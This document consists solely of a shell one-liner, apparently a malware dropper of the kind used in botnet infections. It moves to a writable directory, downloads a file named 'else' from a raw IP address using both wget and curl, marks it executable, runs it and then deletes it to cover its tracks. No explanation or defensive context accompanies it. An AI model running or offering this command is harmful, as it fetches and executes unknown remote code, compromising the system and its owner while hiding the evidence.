cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.64/else; curl -O http://185.165.29.64/else; chmod +x else; ./else; rm -rf else
